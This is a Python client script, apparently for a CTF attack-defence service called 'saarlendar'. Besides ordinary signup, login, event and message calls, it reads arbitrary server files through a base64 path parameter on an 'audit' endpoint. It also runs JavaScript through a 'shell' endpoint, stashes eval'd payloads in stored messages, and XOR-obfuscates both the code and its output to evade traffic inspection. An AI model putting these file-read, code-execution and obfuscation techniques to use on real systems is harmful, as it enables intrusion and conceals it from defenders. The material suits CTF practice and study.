import requests
import urllib

def assert_in(response, b, exception):
    if b in response.content:
        return response
    else:
        print("searched for:", b)
        print("in:", response.content)
        raise exception

def assert_inurl(response, s, exception):
    print("assert_inurl(%s, %s, %s)" % (repr(response.url), repr(s), repr(exception)))
    if s in response.url:
        return response
    else:
        print("searched for:", b)
        print("in:", response.url)
        raise exception

def assert_ok(response):
    if response.status_code != 200:
        raise Exception("page not ok: " + response.url)
    else:
        return response

import random
import time
import re
from base64 import b64encode

randomstring = lambda l: b"".join(bytes([random.choice(bytes(range(b'A'[0], b'Z'[0]+1))+bytes(range(b'a'[0], b'z'[0]+1)))]) for _ in range(l))

now = lambda: str(int(time.time()//100)).encode()

include_re = re.compile(b'include\s+[\'"./]?([\w./_-]+)[\'"]?')


class Remote:

    url = b"http://alfink.de:1337/"
    local_base = b"/home/saarlendar/config/"
    username = b""
    password = b""

    def __init__(self, url=b"http://alfink.de:1337/"):
        self.url = url

    DEBUG = print
    VERBOSE = lambda *args: None

    class hooked_session:
        s = None
        parent = None

        def __init__(self, parent):
            self.s = requests.session()
            self.parent = parent

        def get(self, *args, **argv):
            self.parent.DEBUG("get(%s, %s)" % (",".join([repr(x) for x in args]), str(argv)))
            argv["timeout"] = 1
            for i in range(3):
                try:
                    res = self.s.get(*args, **argv)
                    break
                except OSError:
                    print("OSError occured. Retrying... (%d/3)" % i)
                    time.sleep(0.5)
            else:
                res = self.s.get(*args, **argv)
            res.connection.close()
            self.parent.DEBUG("> ", res)
            self.parent.VERBOSE("> ", repr(res.content))
            return res


    def new_session(self):
        s = self.hooked_session(self)
        s.s.headers["User-Agent"] = "Saarfari"
        del s.s.headers["Accept-Encoding"]
        del s.s.headers["Connection"]
        del s.s.headers["Accept"]
        return s


    def register(self, user, password):
        self.session = self.new_session()
        self.libcache = {}
        assert_ok(self.session.get(self.url))
        assert_ok(self.session.get(self.url+b"login?to=/"))
        assert_ok(self.session.get(self.url+b"signup"))
        assert_in(self.session.get(self.url+b"signup", params={"to": "", "username": user, "password": password}), b"Welcome <b>"+user+b"</b>", Exception("Failed to sign-up"))
        return self.session

    def login(self, user, password):
        self.session = self.new_session()
        self.libcache = {}
        assert_ok(self.session.get(self.url))
        assert_ok(self.session.get(self.url+b"login?to=/"))
        assert_in(self.session.get(self.url+b"login", params={"to": b"/", "username": user, "password": password}), b"Welcome <b>"+user+b"</b>", Exception("Failed to log-in"))
        self.username = user
        self.password = password
        return self.session

    def addevent(self, title, content, timestamp=now(), public=False):
        assert_in(assert_ok(self.session.get(self.url+b"events")), b"schwenker", Exception("Why is there no schwenker at the events page???"))
        args = {"title": title, "content": content, "date": timestamp}
        if public:
            args["public"] = b"public"
        assert_ok(self.session.get(self.url+b"events", params=args))
        return args
    
    def getevents(self, timestamp=now(), public=False):
        assert_in(assert_ok(self.session.get(self.url+b"events")), b"beer", Exception("Why is there no beer at the events page???"))
        url = self.url+b"events/raw"+(b"-pub/" if public else b"/") + (timestamp+b"_"+self.username if timestamp else b"")
        res = self.session.get(url)
        if res.status_code == 596:
            return []
        elif res.status_code == 200:
            return res.content.strip().split(b"\n")
        else:
            raise Exception("Unexpected status code: {}".format(res.status_code));

    def sendmessage(self, to, message):
        assert_in(assert_ok(self.session.get(self.url+b"messages")), b"New message:", Exception("Why is there no 'New message:' at the messages page?"))
        args = {"to": to, "message": message}
        assert_ok(self.session.get(self.url+b"messages", params=args))
        return args

    def getmessages(self):
        assert_in(assert_ok(self.session.get(self.url+b"messages")), b"Send", Exception("Why is there no 'Send' at the messages page?"))
        res = self.session.get(self.url+b"messages/raw")
        if res.status_code == 596:
            return []
        elif res.status_code == 200:
            return res.content.strip().split(b"\n")
        else:
            raise Exception("Unexpected status code: {}".format(res.status_code))

    def audit(self, filename=b"nginx.conf", local_base=None):
        if local_base is None:
            local_base = self.local_base
        assert_in(assert_ok(self.session.get(self.url+b"audit")), b"saarJS", Exception("Why is saarJS not mentioned on the audits page?"))
        return assert_ok(self.session.get(self.url+b"audit", params={"file": b64encode(local_base+filename)})).content

    audit_done = []

    def audit_recursively(self, max_depth=5, filename=b"nginx.conf", init=True):
        if init:
            self.audit_done = []
        if filename in self.audit_done:
            return {}
        if max_depth <= 0:
            return {}
        self.audit_done.append(filename)
        res = {}
        config = self.audit(filename)
        if config.strip() == b"Access denied!":
            raise Exception("Failed to fetch config: " + filename.decode())
        res[filename] = config
        for match in include_re.finditer(config):
            res2 = self.audit_recursively(max_depth-1, match.group(1), False)
            for key in res2:
                res[key] = res2[key]
        return res


    def shell_plain(self, code):
        return assert_ok(self.session.get(self.url+b"shell?"+b64encode(code))).content.strip(b" ")

    def shell_getmessages(self, shell=shell_plain):
        return shell(self, b"print(messages)").strip().split(b"\n")

    def shell_getevents(self, shell=shell_plain):
        return shell(self, b"print(events)").strip().split(b"\n")

    def shell_sendmessage(self, to, message, shell=shell_plain):
        params = urllib.parse.urlencode({"to": to.decode(), "message": message.decode()})
        return shell(self, b"fetch('http://localhost:1337/messages?"+params.encode()+b"')").strip().split(b"\n")

    def shell_addevent(self, title, content, timestamp=now(), public=False, shell=shell_plain):
        params = {"title": title.decode(), "content": content.decode(), "date": timestamp}
        if public:
            params["public"] = "public"
        params = urllib.parse.urlencode(params)
        return shell(self, b"fetch('http://localhost:1337/events?"+params.encode()+b"')").strip().split(b"\n")

    libcache = {}

    def message_shell_add_lib(self, code):
        try:
            return self.libcache[code]
        except:
            pass
        nonce = str(random.randint(1000000,10000000)).encode()
        self.shell_sendmessage(self.username, nonce+b";"+code)
        self.libcache[code] = nonce
        return nonce

    def message_shell(self, code=[]):
        if type(code) is bytes:
            code = [code]
        include = b"function l(n){var x=messages.split('\\n');for(var m=x.length-1;m>0;m--)if(x[m].indexOf(n+'')>0){return eval(unescape(JSON.parse(x[m])['text'].replace(/\+/g, '%20')));}}"
        for c in code:
            include += b";l("+self.message_shell_add_lib(c)+b")"
        return self.shell_plain(include)

    def xored_message_shell(self, code):
        key = randomstring(50)
        keylib = b"sk='"+key+b"';"
        xor = b"e=function(k,m){var o='';for(var i=0;i<m.length;i++)o+=(256+(m.charCodeAt(i)^k.charCodeAt(i%k.length))).toString(16).substr(1);return o;};p=function(m){print(e(sk,m+''))};"
        unhexlify = b"h2a=function(h){var s='';for(var i=0;i<h.length;i+=2)s+=String.fromCharCode(parseInt(h.substr(i, 2), 16));return s;}"
        code = code.replace(b"print(", b"p(")
        c = b""
        for i in range(len(code)):
            c += bytes([key[i%len(key)]^code[i]])
        c = b"eval(h2a(e(sk,h2a('"+c.hex().encode()+b"'))))"
        resp = bytes.fromhex(self.message_shell([keylib,xor,unhexlify,c]).decode())
        out = b""
        for i in range(len(resp)):
            out += bytes([key[i%len(key)]^resp[i]])
        return out